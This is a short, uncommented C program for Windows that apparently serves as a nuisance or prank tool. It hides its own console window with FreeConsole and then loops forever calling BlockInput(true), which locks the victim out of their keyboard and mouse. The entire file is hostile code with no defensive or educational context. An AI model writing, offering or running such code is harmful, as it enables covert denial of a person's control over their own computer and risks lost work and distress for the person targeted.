#include <windows.h>

int main()
{
    FreeConsole();
    while (1)
    {
        BlockInput(true);
    }
}
